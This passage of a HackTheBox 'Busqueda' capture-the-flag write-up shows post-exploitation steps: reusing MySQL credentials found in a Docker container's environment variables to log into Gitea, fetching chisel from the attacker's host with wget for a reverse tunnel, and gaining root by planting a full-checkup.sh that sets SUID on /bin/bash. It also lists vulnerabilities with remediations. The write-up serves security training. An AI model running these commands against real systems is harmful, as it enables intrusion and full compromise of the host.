IPAddresses&quot;:null,&quot;SecondaryIPv6Addresses&quot;:null,&quot;EndpointID&quot;:&quot;&quot;,&quot;Gateway&quot;:&quot;&quot;,&quot;GlobalIPv6Address&quot;:&quot;&quot;,&quot;GlobalIPv6PrefixLen&quot;:0,&quot;IPAddress&quot;:&quot;&quot;,&quot;IPPrefixLen&quot;:0,&quot;IPv6Gateway&quot;:&quot;&quot;,&quot;MacAddress&quot;:&quot;&quot;,&quot;Networks&quot;:{&quot;docker_gitea&quot;:{&quot;IPAMConfig&quot;:null,&quot;Links&quot;:null,&quot;Aliases&quot;:[&quot;f84a6b33fb5a&quot;,&quot;db&quot;],&quot;NetworkID&quot;:&quot;cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227&quot;,&quot;EndpointID&quot;:&quot;79150f24bdc46c593085cd837bc609e91d375358e71a77fc77b3c1926744f31c&quot;,&quot;Gateway&quot;:&quot;172.19.0.1&quot;,&quot;IPAddress&quot;:&quot;172.19.0.3&quot;,&quot;IPPrefixLen&quot;:16,&quot;IPv6Gateway&quot;:&quot;&quot;,&quot;GlobalIPv6Address&quot;:&quot;&quot;,&quot;GlobalIPv6PrefixLen&quot;:0,&quot;MacAddress&quot;:&quot;02:42:ac:13:00:03&quot;,&quot;DriverOpts&quot;:null}}}}</code></pre>
+        <p id="dd329a33-7cae-4fb5-b23a-52a0c5496e12">
+          There are multiple environment variable on this container, two of them are particularly interesting : 
+        </p>
+        
+        
+        
+<pre id="47e3a9f2-2e9e-472e-98d9-cd8ab46dc54d" class="code"><code>MYSQL_ROOT_PASSWORD=j[HIDDEN]F
+MYSQL_PASSWORD=y[HIDDEN]h</code></pre>
+        <p id="7dc43dbe-2f5a-4cb5-aba2-e055f0b4a27b">
+          We can try to use the password from 
+          
+            
+              MYSQL_ROOT_PASSWORD
+            
+          
+           to connect to 
+          
+            <a href="https://www.mysql.com/fr/">
+              MySQL
+            </a>
+          
+           as 
+          
+            
+              root
+            
+          
+           : 
+        </p>
+        
+        
+        
+<pre id="00d0bde9-219d-4e7d-9b0a-71848d66bf09" class="code"><code>(remote) svc@busqueda:/var/www/app/.git$ mysql -h 127.0.0.1 -u root -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 66
+Server version: 8.0.31 MySQL Community Server - GPL
+
+Copyright (c) 2000, 2023, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.
+
+mysql&gt;</code></pre>
+        <p id="df3059bd-ccfa-4bcd-94ff-a55c6806bff6">
+          Now, we have access to 
+          
+            <a href="https://www.mysql.com/fr/">
+              MySQL
+            </a>
+          
+          . Let’s list 
+          
+            
+              databases
+            
+          
+           : 
+        </p>
+        
+        
+        
+<pre id="b0c52d51-fa78-4361-b189-1361935b5c3c" class="code"><code>mysql&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| gitea              |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0.00 sec)</code></pre>
+        <p id="31d75e75-3da0-4eb1-b69b-892927da0258">
+          There is a 
+          
+            
+              gitea
+            
+          
+           database. We also found a container for 
+          
+            
+              gitea
+            
+          
+           when we used 
+          
+            
+              docker-ps
+            
+          
+           earlier. There is no other interesting informations in the database since we cannot crack any password hashes. Let’s use 
+          
+            
+              netstat -tulpn
+            
+          
+           to see on what port 
+          
+            <a href="https://gitea.io/en-us/">
+              Gitea
+            </a>
+          
+           is accessible : 
+        </p>
+        
+        
+        
+<pre id="c35f8310-c113-40b6-b769-e043173efa0c" class="code"><code>(remote) svc@busqueda:/var/www/app/.git$ netstat -tulpn
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      1543/python3        
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:43765         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:222           0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -</code></pre>
+        <p id="f19611ff-3f8f-4a9a-bd4d-65b5fcdd5699">
+          Let’s try to use 
+          <a href="https://curl.se/">
+            
+              curl
+            
+          </a>
+           on port 
+          
+            
+              3000
+            
+          
+           to see what response we have : 
+        </p>
+        
+        
+        
+<pre id="875bc00c-1b1c-4938-a4b4-6a75e633f3ab" class="code"><code>(remote) svc@busqueda:/var/www/app/.git$ curl localhost:3000 | head
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en-US&quot; class=&quot;theme-auto&quot;&gt;
+&lt;head&gt;
+        &lt;meta charset=&quot;utf-8&quot;&gt;
+        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
+        &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt;
+        &lt;link rel=&quot;manifest&quot; href=&quot;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRo5hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2dpdGVhLnNlYXJjaGVyLmaHR0cDovL2dpdGVhLnNlYXJjaGVyLmh0Yi9hc3NldHMvaW1nL2xvZ28ucG5nIiwidHlwZSI6ImltYWdlL3BuZyIsInNpemVzR0cDovL2dpdGVhLnNlYXJjaGVyLmh0Yi9hc3NldHMvaW1nL2xvZ28uc3ZnIiwidHlwZSI6ImltYWdlL3N2Zyt4bWwiLCJzaX
+        &lt;meta name=&quot;theme-color&quot; content=&quot;#6cc644&quot;&gt;
+        &lt;meta name=&quot;default-theme&quot; content=&quot;auto&quot;&gt;
+        &lt;meta name=&quot;author&quot; content=&quot;Gitea - Git with a cup of tea&quot;&gt;
+100 13237    0 13237    0     0  1167k      0 --:--:-- --:--:-- --:--:-- 1292k
+curl: (23) Failed writing body</code></pre>
+        <p id="c4e2fb42-3102-4a0a-8256-5285226563d2">
+          So 
+          
+            <a href="https://gitea.io/en-us/">
+              Gitea
+            </a>
+          
+           is on port 
+          
+            
+              3000
+            
+          
+          , but it is only accessible locally. We can use 
+          <a href="https://github.com/jpillora/chisel">
+            
+              chisel
+            
+          </a>
+           to port forward port 
+          
+            
+              3000
+            
+          
+           to our attacking host. First, let’s set up a 
+          
+            <a href="https://github.com/jpillora/chisel">
+              chisel
+            </a>
+          
+           server : 
+        </p>
+        
+        
+        
+<pre id="07311466-e825-4799-8d14-f4aa15a04007" class="code"><code>┌──(kali㉿kali)-[~/…/HTB/CTF/Easy/Busqueda]
+└─$ chisel server -p 9999 --reverse                       
+2023/05/26 13:14:40 server: Reverse tunnelling enabled
+2023/05/26 13:14:40 server: Fingerprint OrJCa8LzIgyUeffAFVKczpc12EeCbzRsqjlmtSixtAQ=
+2023/05/26 13:14:40 server: Listening on http://0.0.0.0:9999</code></pre>
+        <p id="2d59185f-a323-4e25-864f-9e083856a05f">
+          Now, after uploading a 
+          <a href="https://github.com/jpillora/chisel">
+            
+              chisel
+            
+          </a>
+           binary on the target, we can run a 
+          
+            <a href="https://github.com/jpillora/chisel">
+              chisel
+            </a>
+          
+           client to forward port 
+          
+            
+              3000
+            
+          
+           : 
+        </p>
+        
+        
+        
+<pre id="007338c2-a7d4-4a46-aec7-3ad6b816f3a6" class="code"><code>(remote) svc@busqueda:/home/svc$ wget 10.10.16.25/chisel
+--2023-05-26 17:16:00--  http://10.10.16.25/chisel
+Connecting to 10.10.16.25:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 8384512 (8.0M) [application/octet-stream]
+Saving to: ‘chisel’
+
+chisel                          100%[=====================================================&gt;]   8.00M  7.26MB/s    in 1.1s    
+
+2023-05-26 17:16:01 (7.26 MB/s) - ‘chisel’ saved [8384512/8384512]
+
+(remote) svc@busqueda:/home/svc$ chmod +x chisel
+(remote) svc@busqueda:/home/svc$ ./chisel client 10.10.16.25:9999 R:3000:localhost:3000</code></pre>
+        <p id="3e4afa0b-b365-465b-aa5a-78e592ade2f5">
+          Now, on our attacking host, we can open our web browser and go to 
+          
+            
+              <a href="http://localhost:3000/">
+                http://localhost:3000/
+              </a>
+            
+          
+           : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Busqueda%20(Easy)%20d1fd3049395145f3b7e702cb6f3bfe5b/Untitled%208.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Busqueda/Untitled%208.png"/>
+          </a>
+        
+        <p id="7cdb21e9-73e1-4983-8601-34b1b96a78fa">
+          Then, we can try to login as 
+          
+            
+              administrator
+            
+          
+           on 
+          
+            <a href="https://gitea.io/en-us/">
+              Gitea
+            </a>
+          
+           using the password we found earlier in the environment variables of the docker container. The password from 
+          
+            
+              MYSQL_ROOT_PASSWORD
+            
+          
+           variable will not work, but when we try the one from 
+          
+            
+              MYSQL_PASSWORD
+            
+          
+           : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Busqueda%20(Easy)%20d1fd3049395145f3b7e702cb6f3bfe5b/Untitled%209.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Busqueda/Untitled%209.png"/>
+          </a>
+        
+        <p id="a0693609-6d4f-4346-a049-d95d252c67fe">
+          We successfully logged in and we are redirected to our list of projects. Let’s see what’s on the 
+          
+            
+              scripts
+            
+          
+           repository : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Busqueda%20(Easy)%20d1fd3049395145f3b7e702cb6f3bfe5b/Untitled%2010.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Busqueda/Untitled%2010.png"/>
+          </a>
+        
+        <p id="9945f0b4-1c76-47f8-92c0-1b9a0bad61be">
+          Let’s take a look at 
+          
+            
+              system-checkup.py
+            
+          
+           : 
+        </p>
+        
+        
+        
+<pre id="2b9cc0b1-4816-43d7-ae11-16067c36c114" class="code"><code>#!/bin/bash
+import subprocess
+import sys
+
+actions = [&#x27;full-checkup&#x27;, &#x27;docker-ps&#x27;,&#x27;docker-inspect&#x27;]
+
+def run_command(arg_list):
+    r = subprocess.run(arg_list, capture_output=True)
+    if r.stderr:
+        output = r.stderr.decode()
+    else:
+        output = r.stdout.decode()
+
+    return output
+
+
+def process_action(action):
+    if action == &#x27;docker-inspect&#x27;:
+        try:
+            _format = sys.argv[2]
+            if len(_format) == 0:
+                print(f&quot;Format can&#x27;t be empty&quot;)
+                exit(1)
+            container = sys.argv[3]
+            arg_list = [&#x27;docker&#x27;, &#x27;inspect&#x27;, &#x27;--format&#x27;, _format, container]
+            print(run_command(arg_list)) 
+        
+        except IndexError:
+            print(f&quot;Usage: {sys.argv[0]} docker-inspect &lt;format&gt; &lt;container_name&gt;&quot;)
+            exit(1)
+    
+        except Exception as e:
+            print(&#x27;Something went wrong&#x27;)
+            exit(1)
+    
+    elif action == &#x27;docker-ps&#x27;:
+        try:
+            arg_list = [&#x27;docker&#x27;, &#x27;ps&#x27;]
+            print(run_command(arg_list)) 
+        
+        except:
+            print(&#x27;Something went wrong&#x27;)
+            exit(1)
+
+    elif action == &#x27;full-checkup&#x27;:
+        try:
+            arg_list = [&#x27;./full-checkup.sh&#x27;]
+            print(run_command(arg_list))
+            print(&#x27;[+] Done!&#x27;)
+        except:
+            print(&#x27;Something went wrong&#x27;)
+            exit(1)
+            
+
+if __name__ == &#x27;__main__&#x27;:
+
+    try:
+        action = sys.argv[1]
+        if action in actions:
+            process_action(action)
+        else:
+            raise IndexError
+
+    except IndexError:
+        print(f&#x27;Usage: {sys.argv[0]} &lt;action&gt; (arg1) (arg2)&#x27;)
+        print(&#x27;&#x27;)
+        print(&#x27;     docker-ps     : List running docker containers&#x27;)
+        print(&#x27;     docker-inspect : Inpect a certain docker container&#x27;)
+        print(&#x27;     full-checkup  : Run a full system checkup&#x27;)
+        print(&#x27;&#x27;)
+        exit(1)</code></pre>
+        <p id="b2910f52-d847-46f9-a88e-f015a8945459">
+          It’s the file we are able to run as 
+          
+            
+              root
+            
+          
+           with our sudo rights. If you look at the end of the 
+          
+            
+              process_action
+            
+          
+           function, you can notice something wrong : 
+        </p>
+        
+        
+        
+<pre id="5a7d3013-95da-4300-a314-8015615c9132" class="code"><code>elif action == &#x27;full-checkup&#x27;:
+        try:
+            arg_list = [&#x27;./full-checkup.sh&#x27;]
+            print(run_command(arg_list))
+            print(&#x27;[+] Done!&#x27;)
+        except:
+            print(&#x27;Something went wrong&#x27;)
+            exit(1)</code></pre>
+        <p id="7d9752e7-8681-4e57-833f-f310b467b9d6">
+          The problem here is that the script will run 
+          
+            
+              full-checkup.sh
+            
+          
+           from where the script is run. For example, if we run the script while our current wordking directory is 
+          
+            
+              /tmp
+            
+          
+          , it will try to run 
+          
+            
+              /tmp/full-checkup.sh
+            
+          
+          . We can craft a malicious script named 
+          
+            
+              full-checkup.sh
+            
+          
+           that sets the 
+          
+            
+              SUID
+            
+          
+           bit on 
+          
+            
+              /bin/bash
+            
+          
+           : 
+        </p>
+        
+        
+        
+<pre id="026f019c-23c9-485c-916a-d4745eb19269" class="code"><code>(remote) svc@busqueda:/home/svc$ nano full-checkup.sh
+(remote) svc@busqueda:/home/svc$ cat full-checkup.sh 
+#!/bin/bash
+
+chmod +s /bin/bash
+echo &quot;It works !&quot;</code></pre>
+        <p id="8b3c9f97-aba2-4e31-a58d-9659f64d9c03">
+          Now, let’s run 
+          
+            
+              sudo python3 /opt/scripts/system-checkup.py full-checkup
+            
+          
+           : 
+        </p>
+        
+        
+        
+<pre id="b1bf38b6-ed08-41c8-95a9-1007d794f7ab" class="code"><code>(remote) svc@busqueda:/home/svc$ chmod +x full-checkup.sh 
+(remote) svc@busqueda:/home/svc$ sudo python3 /opt/scripts/system-checkup.py full-checkup
+It works !
+
+[+] Done!</code></pre>
+        <p id="2f20ad82-745d-41bd-bd2a-a192a40a15da">
+          Our script has been executed successfully. Now let’s take a look at 
+          
+            
+              /bin/bash
+            
+          
+           permissions : 
+        </p>
+        
+        
+        
+<pre id="4df0f71b-c7fd-4f8f-a4d5-0c1db6db123d" class="code"><code>(remote) svc@busqueda:/home/svc$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bash</code></pre>
+        <p id="adb9bf99-99d3-4ff3-b2c0-fb026b477057">
+          It has the 
+          
+            
+              SUID
+            
+          
+           bit enabled now. Finally, we can run 
+          
+            
+              bash -p
+            
+          
+           to get a shell as 
+          
+            
+              root
+            
+          
+           : 
+        </p>
+        
+        
+        
+<pre id="309de4d4-e5ba-4a8f-9ce1-ab001ed04ab9" class="code"><code>(remote) svc@busqueda:/home/svc$ bash -p
+(remote) root@busqueda:/home/svc# whoami
+root
+(remote) root@busqueda:/home/svc# id
+uid=1000(svc) gid=1000(svc) euid=0(root) egid=0(root) groups=0(root)</code></pre>
+        <h1 id="586c3ef5-932e-4cd9-b8b2-e67efd80c626">
+          Clearing tracks
+        </h1>
+        <table id="18207566-b555-4292-bd1a-a02543c6ecaa">
+          <thead>
+            <tr id="ef29ea18-b092-4805-aa26-fd0e7aa1b934">
+              <th id="xDBb">
+                Step
+              </th>
+              <th id="^z&gt;Y">
+                Tracks to remove
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="b67e7e4f-ac30-4225-be24-13118d60d25b">
+              <td id="xDBb">
+                Post-exploitati
+                
+                  on - Privilege escalation
+                
+              </td>
+              <td id="^z&gt;Y">
+                - Remove the SUID on /bin/bash
+                
+                - Remove 
+                
+                
+                  /home/svc/full-checkup.sh
+                
+                
+                - Remove the exploit directory from /tmp
+                
+                - Kill chisel client process
+                
+                
+                
+                  - Remove /home/svc/chisel
+                
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h1 id="16950a76-2171-48e0-a795-f719695163c9">
+          Vulnerabilities summary
+        </h1>
+        <h2 id="6468bbe7-4d5d-4e7d-aff6-a931e4b07532">
+          
+            Remote Code Execution
+          
+        </h2>
+        <table id="dfae8d26-4eb9-414e-8c6d-a65ca6f83ee6">
+          <thead>
+            <tr id="61f0425c-d761-4cb7-9805-ebf1df029253">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="c693f741-08cb-4bef-a8d0-05e46294370d">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                Searchor
+              </td>
+            </tr>
+            <tr id="132a90c7-d61c-465b-bdab-380189df79ef">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  9.8
+                
+              </td>
+            </tr>
+            <tr id="d387520d-950a-4cee-8ba1-6ac78a640587">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  
+                    CRITICAL
+                  
+                
+              </td>
+            </tr>
+            <tr id="ac5cb6f4-344f-43f0-b27e-2f7813ba7154">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                
+                  Network
+                
+              </td>
+            </tr>
+            <tr id="08a1ff1b-ce8e-451c-a56b-fa5588f37288">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                Allows an attacker to execute arbitrary code as 
+                
+                  
+                    svc
+                  
+                
+                 to gain a foothold on the system.
+                
+                
+                This has a 
+                
+                
+                  
+                    high
+                  
+                
+                 impact on the 
+                
+                  
+                    confidentiality
+                  
+                
+                
+                  , 
+                
+                
+                  
+                    integrity
+                  
+                
+                
+                   and 
+                
+                
+                  
+                    availability 
+                  
+                
+                of the affected component.
+              </td>
+            </tr>
+            <tr id="5797b1e5-1223-4c2c-8896-fa043fd07335">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                Update 
+                
+                  <a href="https://github.com/ArjunSharda/Searchor">
+                    Searchor
+                  </a>
+                
+                , this vulnerability is patched since version 
+                
+                  
+                    2.4.2
+                  
+                
+                .
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h2 id="8c356623-af66-43c8-822c-686a4d65db83">
+          
+            Arbitrary Code Execution
+          
+        </h2>
+        <table id="c6c89f5a-2a6d-4bf7-8311-c0d8e66a9dc0">
+          <thead>
+            <tr id="1c22d134-1912-4a82-8830-221b00ed75b4">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="f6801673-d3fc-4555-8698-b6d293ace121">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                
+                  system-checkup.py script
+                
+              </td>
+            </tr>
+            <tr id="21b5206a-97d3-4b49-a946-a81988ecfa7b">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  7.8
+                
+              </td>
+            </tr>
+            <tr id="8ba4189f-b9f1-4f0d-a7ff-a32b5559069b">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  
+                    HIGH
+                  
+                
+              </td>
+            </tr>
+            <tr id="d597e493-6438-42db-8ace-92f402534b62">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                
+                  Local
+                
+              </td>
+            </tr>
+            <tr id="071992d3-b977-4850-956f-17d5bc824109">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                Allows an attacker to execute an arbitrary shell script named 
+                
+                  
+                    full-checkup.sh
+                  
+                
+                 in his current working directory. This can lead to full system compromise.
+                
+                
+                This has a 
+                
+                
+                  
+                    high
+                  
+                
+                 impact on the 
+                
+                  
+                    confidentiality
+                  
+                
+                
+                  , 
+                
+                
+                  
+                    integrity
+                  
+                
+                
+                   and 
+                
+                
+                  
+                    availability 
+                  
+                
+                of the entire system.
+              </td>
+            </tr>
+            <tr id="46f8f5da-c3cf-48b5-9191-460a9ec16b0c">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                Use absolute path instead of relative path.
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h1 id="758e688a-25da-4b3b-8342-7c3b177ff727">
+          Tools used
+        </h1>
+        <table id="aaae60d7-94d0-4f24-a5b2-6c5fc5e925a6">
+          <thead>
+            <tr id="41b8b924-dc5d-436c-a224-0e34099af5f8">
+              <th id="`&gt;MF">
+                Tool
+              </th>
+              <th id="A|qY">
+                Purpose
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="e06dc4a7-30f0-4f99-afa3-d3a08466bd73">
+              <td id="`&gt;MF">
+                <a href="https://nmap.org/book/man.html">
+                  
+                    Nmap
+                  
+                </a>
+              </td>
+              <td id="A|qY">
+                - Scan for open ports
+                
+                - Scan services versions
+                
+              </td>
+            </tr>
+            <tr id="5f2633f0-4115-4568-a46e-f7b963220b41">
+              <td id="`&gt;MF">
+                <a href="https://portswigger.net/burp">
+                  BurpSuite
+                </a>
+              </td>
+              <td id="A|qY">
+                - Analyse and modify requests sent to the web server
+              </td>
+            </tr>
+            <tr id="982d6d40-0432-4ae9-989a-dbb5b5982bed">
+              <td id="`&gt;MF">
+                
+                  <a href="https://curl.se/">
+                    curl
+                  </a>
+                
+              </td>
+              <td id="A|qY">
+                - Send web requests to enumerate local web services
+              </td>
+            </tr>
+            <tr id="ecb69385-9374-41c8-ab10-5103deb6c7cc">
+              <td id="`&gt;MF">
+                <a href="https://github.com/calebstewart/pwncat">
+                  Pwncat-cs
+                </a>
+              </td>
+              <td id="A|qY">
+                - Handle reverse shell connections
+              </td>
+            </tr>
+            <tr id="a55038db-e856-4454-b93b-7fb0afb5505c">
+              <td id="`&gt;MF">
+                
+                  <a href="https://github.com/jpillora/chisel">
+                    chisel
+                  </a>
+                
+              </td>
+              <td id="A|qY">
+                - Port forward local services to the attacking host
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h1 id="3f75ef1b-64bf-49d0-8e3e-f048e178b1a1">
+          Sources
+        </h1>
+        <ul id="24861105-47b6-494f-afcf-437504910cda">
+          <li>
+            Pull request for the RCE in 
+            
+              <a href="https://github.com/ArjunSharda/Searchor">
+                Searchor
+              </a>
+            
+             : 
+            <a href="https://github.com/ArjunSharda/Searchor/pull/130">
+              https://github.com/ArjunSharda/Searchor/pull/130
+            </a>
+          </li>
+        </ul>
+      </div>
+    
+    <span>
+    </span>
+  
+
